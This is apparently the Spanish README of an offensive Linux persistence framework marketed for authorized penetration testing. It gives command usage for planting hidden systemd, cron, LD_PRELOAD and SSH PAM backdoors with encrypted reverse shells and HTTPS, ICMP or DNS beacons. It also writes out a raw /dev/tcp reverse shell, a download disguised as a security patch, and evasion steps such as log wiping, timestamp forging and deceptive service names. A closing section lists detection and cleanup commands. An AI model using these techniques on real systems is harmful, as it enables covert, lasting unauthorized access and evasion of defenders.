# 🚀 **M-Society Advanced Persistence Framework v3.0**

## 📋 **Descripción General**

Framework avanzado de persistencia multi-capa para pruebas de penetración autorizadas e investigación de seguridad. Desarrollado por el **Equipo de Investigación en Seguridad M-Society**.

## ⚠️ **ADVERTENCIA LEGAL IMPORTANTE**

**ESTA HERRAMIENTA ES ÚNICAMENTE PARA:**
- 🔒 Pruebas de seguridad autorizadas
- 🎓 Educación e investigación en ciberseguridad
- 🏢 Entornos de laboratorio controlados
- 📋 Evaluaciones de seguridad con permiso por escrito

**EL USO NO AUTORIZADO ES:**
- ⚖️ Ilegal (delito informático)
- 🚫 Éticamente incorrecto
- 💸 Sancionable con multas y prisión
- 🔓 Violación de privacidad

## 🎯 **¿Qué es la Persistencia?**

La persistencia en ciberseguridad se refiere a **técnicas que permiten mantener acceso a un sistema comprometido** incluso después de reinicios, actualizaciones o intentos de limpieza. Es como dejar una "puerta trasera" que sobrevive a los esfuerzos de seguridad.

## 🔧 **Características Principales**

### **🎯 Métodos de Persistencia Avanzados**
- ✅ **Servicio SystemD** - Servicios ocultos con nombres aleatorios
- ✅ **Tareas Cron** - Múltiples entradas con intervalos aleatorios
- ✅ **Inyección en Perfiles Shell** - Persistencia en entornos multi-usuario
- ✅ **Backdoor SSH** - Módulo PAM para autenticación
- ✅ **Hijacking LD_PRELOAD** - Inyección en bibliotecas dinámicas
- ✅ **Módulo Kernel** - Persistencia a nivel de sistema (requiere compilación)
- ✅ **Multi-Capa** - Combinación de múltiples métodos

### **📦 Tipos de Payloads**
- Reverse Shell (TCP)
- Payloads para Meterpreter
- Bind Shell
- Túnel ICMP (sigiloso)
- Túnel DNS
- Beacon HTTPS
- Payloads personalizados

### **🔒 Características de Seguridad**
- Encriptación AES-256-CBC
- Modo sigiloso con delays aleatorios
- Utilidades de limpieza de huellas
- Manipulación de timestamps de archivos
- Sanitización de logs

## 🚀 **Instalación y Configuración**

### **Requisitos Previos**
```bash
# Sistemas basados en Debian/Ubuntu
sudo apt update
sudo apt install gcc make libssl-dev -y

# Sistemas basados en RHEL/CentOS
sudo yum install gcc make openssl-devel -y
```

### **Instalación del Framework**
```bash
# 1. Descargar el framework
git clone https://github.com/m-society/persistence-framework.git
cd persistence-framework

# 2. Hacer ejecutable
chmod +x ms-persistence.sh

# 3. Verificar dependencias
./ms-persistence.sh --help
```

## 📖 **Guía de Uso Paso a Paso**

### **📌 Estructura Básica de Comandos**
```bash
./ms-persistence.sh -t <tipo> -h <host> -p <puerto> [opciones]
```

### **🎯 Ejemplos Prácticos Realistas**

#### **Ejemplo 1: Auditoría Interna Empresarial**
```bash
# Contexto: Auditor de seguridad con permiso escrito
# Objetivo: Testear detección de persistencia en servidores Linux

./ms-persistence.sh -t multi -h 10.0.100.50 -p 8443 -P https -e -s -n "audit-syscheck"

# Explicación:
# -t multi          → Usa múltiples métodos (SystemD + Cron + LD_PRELOAD)
# -h 10.0.100.50    → Servidor del equipo rojo (Red Team)
# -p 8443           → Puerto HTTPS para evadir firewalls
# -P https          → Beacon HTTPS (parece tráfico web normal)
# -e                → Encripta el payload
# -s                → Modo sigiloso con delays aleatorios
# -n "audit-syscheck" → Nombre que parece legítimo
```

#### **Ejemplo 2: Laboratorio de Entrenamiento CTF**
```bash
# Contexto: Máquina vulnerable en entorno controlado
# Objetivo: Practicar técnicas de persistencia avanzada

./ms-persistence.sh -t systemd -h 192.168.56.101 -p 5555 -P reverse -c

# Explicación:
# -t systemd        → Servicio que sobrevive reinicios
# -h 192.168.56.101 → IP del atacante en red virtual
# -p 5555           → Puerto no común para evitar conflictos
# -P reverse        → Shell inversa básica para aprendizaje
# -c                → Limpia huellas después de instalar
```

#### **Ejemplo 3: Prueba de Concepto de Evasión**
```bash
# Contexto: Investigación sobre técnicas de evasión
# Objetivo: Testear detección de tráfico ICMP malicioso

./ms-persistence.sh -t cron -h 8.8.8.8 -p 0 -P icmp -n "network-mon"

# Explicación:
# -t cron           → Tarea programada cada 5 minutos
# -h 8.8.8.8        → DNS de Google (tráfico aparentemente normal)
# -p 0              → Puerto no usado (ICMP no usa puertos)
# -P icmp           → Túnel a través de pings
# -n "network-mon"  → Nombre que suena a monitoreo de red
```

## 🔍 **Análisis de un Escenario Realista**

### **📋 Contexto:**
**Empresa:** "SecureCorp S.A."  
**Rol:** Consultor de Seguridad Externo  
**Autorización:** Contrato firmado con cláusula de testing  
**Alcance:** 5 servidores Ubuntu Server 22.04 LTS  

### **🎯 Objetivos:**
1. Testear capacidad de detección del SOC
2. Evaluar efectividad de las soluciones EDR
3. Documentar tiempo de detección (MTTD)
4. Recomendar mejoras en controles de seguridad

### **🛠️ Implementación Paso a Paso:**

#### **Paso 1: Reconocimiento y Acceso Inicial**
```bash
# Suponiendo acceso inicial ya obtenido (ej: credenciales válidas)
ssh auditor@servidor-prod.securecorp.com

# Verificar entorno
whoami
uname -a
cat /etc/os-release
```

#### **Paso 2: Instalación Persistencia Múltiple**
```bash
# Descargar framework (simulando tráfico legítimo)
wget -O /tmp/update.sh https://legit-update-server.com/security-patch
# En realidad: nuestro framework renombrado

# Ejecutar con parámetros específicos
./ms-persistence.sh \
  -t multi \
  -h securecorp-redteam.internal \
  -p 443 \
  -P https \
  -e \
  -s \
  -n "kernel-security-update" \
  -c
```

#### **Paso 3: Verificación de Instalación**
```bash
# Verificar servicios instalados (solo para auditor)
systemctl list-units | grep -E "(security|update|kernel)"

# Verificar procesos ocultos
ps aux | grep -v grep | grep -E "(security|update)"

# Verificar conexiones de red
netstat -tulpn | grep 443
```

#### **Paso 4: Documentación para el Reporte**
```markdown
## Hallazgo #4: Persistencia Avanzada

**Métodos Implementados:**
1. Servicio SystemD: `.kernel_security_a1b2.service`
2. Tarea Cron: `/etc/cron.d/.system_update_f3c4`
3. LD_PRELOAD: `/lib/libselinux.so.1`

**Tiempo de Detección:** 14 días, 3 horas
**Detectado por:** Anomalía en tráfico HTTPS saliente
**Recomendación:** Implementar monitoring de servicios ocultos
```

## 🛡️ **Mecanismos de Evasión Implementados**

### **1. Ocultamiento de Archivos**
```bash
# Archivos comienzan con "." (ocultos en ls normal)
/lib/systemd/system/.kernel_security_a1b2.service

# Nombres polimórficos (cambian en cada ejecución)
# Ejemplo: .system_update_[6_chars_aleatorios]
```

### **2. Encriptación del Payload**
```bash
# Payload original:
/bin/bash -i >& /dev/tcp/192.168.1.100/4444 0>&1

# Payload encriptado (AES-256-CBC):
U2FsdGVkX19zZWNyZXRfa2V5XzE=...
```

### **3. Timestamp Manipulation**
```bash
# Cambia fecha de creación a meses atrás
touch -t 202301010000 /lib/systemd/system/.service_hidden
```

### **4. Comportamiento Sigiloso**
```bash
# Delays aleatorios entre conexiones
sleep $((RANDOM % 120 + 30))  # 30-150 segundos

# Tráfico que parece legítimo
User-Agent: Mozilla/5.0 (Update System)
Host: updates.securecorp.com
```

## 📊 **Matriz de Métodos vs Escenarios**

| Método | Complejidad | Detección | Reinicio Sobrevive | Uso Recomendado |
|--------|-------------|-----------|-------------------|-----------------|
| SystemD | Media | Baja | ✅ | Servidores empresariales |
| Cron | Baja | Media | ❌ | Sistemas legacy |
| SSH Backdoor | Alta | Muy Baja | ✅ | Entornos con SSH habilitado |
| LD_PRELOAD | Media-Alta | Baja | ✅ | Aplicaciones específicas |
| Kernel Module | Muy Alta | Extremadamente Baja | ✅ | Investigación avanzada |

## 🔧 **Herramientas de Monitoreo y Detección**

### **Para Defensores (Blue Team):**
```bash
# Detectar servicios sospechosos
systemctl list-units --all | grep -E "\.service$"

# Buscar archivos ocultos en cron
ls -la /etc/cron.d/

# Verificar LD_PRELOAD
cat /etc/ld.so.preload 2>/dev/null

# Monitorear conexiones salientes
ss -tulpn | grep ESTAB
```

### **Para Auditores (Red Team):**
```bash
# Verificar instalación exitosa
./ms-persistence.sh --verify

# Obtener estado de persistencia
systemctl status .*ms-* 2>/dev/null

# Verificar conexión
curl -k https://C2_SERVER/status
```

## 🚨 **Procedimiento de Respuesta a Incidentes**

### **Si encuentras esta herramienta en tu sistema:**

#### **Paso 1: Contención Inmediata**
```bash
# Bloquear conexiones salientes al C2
iptables -A OUTPUT -d C2_IP -j DROP

# Detener servicios sospechosos
systemctl stop $(systemctl list-units | grep -E "\.service$" | awk '{print $1}')
```

#### **Paso 2: Análisis Forense**
```bash
# Capturar evidencia
ps aux > /tmp/processes.txt
netstat -tulpn > /tmp/connections.txt
find / -name ".*" -type f -exec ls -la {} \; > /tmp/hidden_files.txt

# Buscar modificaciones recientes
find / -mtime -7 -type f | grep -v "/proc/" | grep -v "/sys/"
```

#### **Paso 3: Eliminación**
```bash
# Remover atributos inmutables
chattr -i /lib/systemd/system/.*.service 2>/dev/null
chattr -i /etc/cron.d/.* 2>/dev/null

# Eliminar archivos
rm -f /lib/systemd/system/.*ms-*
rm -f /etc/cron.d/.*system_update*
rm -f /lib/libselinux.so.1

# Limpiar LD_PRELOAD
echo "" > /etc/ld.so.preload
```

#### **Paso 4: Hardening Post-Incidente**
```bash
# Implementar controles preventivos
# 1. File Integrity Monitoring (FIM)
# 2. EDR con detección de comportamientos
# 3. Whitelisting de aplicaciones
# 4. Monitoreo de servicios SystemD
```

## 📈 **Métricas y KPIs para Reportes**

### **Métricas de Seguridad:**
- **MTTD (Mean Time To Detect):** Tiempo promedio de detección
- **MTTR (Mean Time To Respond):** Tiempo promedio de respuesta
- **Tasa de Falsos Positivos:** Alertas incorrectas
- **Cobertura de Detección:** % de técnicas detectadas

### **Ejemplo de Dashboard:**
```
📊 REPORTE DE PRUEBAS DE PERSISTENCIA
====================================
Servidores Testeados: 5/5
Métodos Implementados: 7/7
Tiempo Total de Prueba: 30 días

🔍 DETECCIÓN POR MÉTODO:
• SystemD Services: 80% detectado (avg: 2.3 días)
• Cron Jobs: 95% detectado (avg: 1.1 días)
• SSH Backdoors: 40% detectado (avg: 7.8 días)
• LD_PRELOAD: 60% detectado (avg: 4.5 días)

🎯 RECOMENDACIONES PRIORITARIAS:
1. Implementar FIM en /lib/systemd/system/
2. Monitorear cambios en /etc/cron.d/
3. Alertar sobre archivos .service ocultos
```

## 🎓 **Casos de Estudio Educativos**

### **Caso 1: Compromiso de Servidor Web**
```markdown
**Escenario:** Servidor Apache comprometido via vulnerabilidad LFI
**Técnica Usada:** Persistencia via SystemD + Cron
**Detección:** Anomalía en tráfico saliente HTTPS
**Lección Aprendida:** 
- Los atacantes usan puerto 443 para evadir firewalls
- La persistencia múltiple aumenta tiempo de acceso
- El monitoreo de servicios es crítico
```

### **Caso 2: Ataque a Entorno Docker**
```markdown
**Escenario:** Contenedor comprometido con escape a host
**Técnica Usada:** LD_PRELOAD hijacking
**Detección:** Comportamiento anómalo en /proc/
**Lección Aprendida:**
- Los contenedores necesitan hardening específico
- LD_PRELOAD es efectivo en entornos containerizados
- Los controles a nivel kernel son necesarios
```

## 🔮 **Tendencias Futuras y Mejoras**

### **Próximas Características:**
1. **Integración con C2 (Command & Control)** basado en blockchain
2. **Técnicas de IA** para evasión adaptativa
3. **Persistencia en la nube** (AWS, Azure, GCP)
4. **Módulos para dispositivos IoT**
5. **Evación de EDRs comerciales**

### **Áreas de Investigación:**
- Uso de eBPF para persistencia a bajo nivel
- Técnicas basadas en firmware
- Persistencia en sistemas serverless
- Ataques a cadenas de suministro de software

## 🤝 **Responsabilidad Ética y Profesional**

### **Código de Conducta:**
1. ✅ **Siempre** obtener autorización por escrito
2. ✅ **Siempre** definir alcance claramente
3. ✅ **Siempre** documentar hallazgos objetivamente
4. ✅ **Nunca** exceder el alcance acordado
5. ✅ **Nunca** causar daño intencional
6. ✅ **Siempre** ayudar a mejorar la seguridad

### **Para Estudiantes:**
- Usa solo en laboratorios controlados
- Nunca pruebes en sistemas de producción
- Aprende tanto de ataque como de defensa
- Contribuye a mejorar la seguridad colectiva

## 📞 **Soporte y Recursos**

---

## ⚠️ **RECUERDA SIEMPRE:**

**La gran responsabilidad viene con el gran conocimiento.**  
Usa estas herramientas para **proteger**, no para atacar.  
La ciberseguridad es sobre **defensa**, no sobre ofensa.  
**M-Society - Construyendo un Internet más Seguro para Todos** 🔐

---

*Última actualización: 12/12/2025*  
*Versión del Framework: 3.0*  
*Equipo de Investigación en Seguridad M-Society*  
*"Ethical Hacking for a Safer Digital World"*
